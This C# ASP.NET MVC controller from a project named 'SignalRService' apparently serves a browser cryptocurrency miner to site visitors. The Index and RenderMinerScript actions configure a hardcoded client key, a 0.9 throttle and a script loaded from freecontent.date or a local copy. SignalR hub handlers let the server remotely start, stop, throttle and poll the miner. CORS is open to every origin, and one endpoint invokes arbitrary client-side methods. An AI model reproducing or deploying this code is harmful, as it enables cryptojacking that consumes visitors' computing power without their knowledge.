﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Http.Cors;
using System.Web.Mvc;
using System.Web.Script.Serialization;
using SignalRService.Utils;

namespace SignalRService.Controllers
{
    [EnableCors(origins: "*", headers: "*", methods: "*")]
    public class ServiceController : BaseController
    {
        private DAL.ServiceContext db = new DAL.ServiceContext();
        public ActionResult Index()
        {
            var baseViewModel = new ViewModels.ServiceBaseViewModel()
            {
                SiganlRBaseConfigurationVieModel = new ViewModels.SignalRBaseConfigurationViewModel()
                {
                    SinalRGroup = "serviceindex"
                },
                 MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
                 {
                     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                     Throttle = "0.9",
                     ScriptUrl = "https://www.freecontent.date./W7KS.js",
                     StartDelayMs = 3000,
                     ReportStatusIntervalMs = 65000
                 }

            };
            return View("Index", baseViewModel);
        }

        public JsonResult SayHello()
        {
            Utils.SignalRServiceUtils.SayHello();
            return Json("done...", JsonRequestBehavior.AllowGet);
        }

        public JsonResult ExecuteCallbackOnClient(string fdata)
        {
            var oParams = new JavaScriptSerializer().Deserialize(fdata, typeof(IEnumerable<string>));
            Hubs.ClientCallbackData data = new Hubs.ClientCallbackData();
            List<string> paramList = oParams as List<string>;

            data.Method = paramList[0];
            paramList.RemoveAt(0);
            data.Parameters = ((object) paramList);

            Utils.SignalRServiceUtils.SendClientCallback(data);
            return Json("done...", JsonRequestBehavior.AllowGet);
        }

        public ActionResult Goto(string url)
        {
            try
            {
                var servicesetting = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == url);
                if (servicesetting == null)
                    return View("UrlNotFound");

                return View(servicesetting.ToServiceSettingViewModel());

            }
            catch (Exception ex)
            {

                return View("Exception",ex);
            }

        }

        //[EnableCors(origins: "*", headers: "*", methods: "*")]
        //public MvcHtmlString RenderMinerScript()
        //{
        //    var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
        //    {
        //        ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
        //        Throttle = "0.9",
        //        ScriptUrl = "https://www.freecontent.date./W7KS.js",
        //        StartDelayMs = 3000,
        //        ReportStatusIntervalMs = 65000
        //    };

        //    var str = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
        //    return new MvcHtmlString(str);
        //}

        public MvcHtmlString RenderMinerScript()
        {
            var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
            {
                ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                Throttle = "0.9",
                ScriptUrl = "https://" + Request.Url.Host + "/Content/W7KS.js",
                StartDelayMs = 3000,
                ReportStatusIntervalMs = 65000
            };

            var str = RenderMinerHubMethods();
            var viewstr = Utils.RenderUtils.RenderRazorViewToString(this, "RenderMiner", MinerConfigurationViewModel);
            viewstr = viewstr.Replace("<script>", "").Replace("</script>", "").Replace("</head>","");

            return new MvcHtmlString(str.ToString() + viewstr);
        }

        private MvcHtmlString RenderMinerHubMethods()
        {
            string str = @"

                  servicehub.client.miner_start = function () {
            start_miner();
        }

        servicehub.client.miner_stop = function () {
            stop_miner();
        }

        servicehub.client.miner_reportStatus = function () {
            //send stats to server
            miner.reportStatus();
        }

        servicehub.client.miner_setThrottle = function (data) {
            miner.client().setThrottle(data);
        }";
            return new MvcHtmlString(str);
        }

        //public PartialViewResult RenderSignalRBase(ViewModels.ServiceSettingViewModel basemodel)
        //{
        //    var modelx = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
        //    {

        //        SinalRGroup = basemodel.ServiceUrl

        //    };
        //    return PartialView("RenderMiner", modelx);
        //}

        //public ActionResult SrcStarter(string url)
        //{
        //    var servicesetting = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == url);
        //    if (servicesetting == null)
        //        return View("UrlNotFound", url);

        //    return View(servicesetting.ToServiceSettingViewModel());
        //}

        public ActionResult Test()
        {
            return View("EXTServiceTest");
        }
    }
}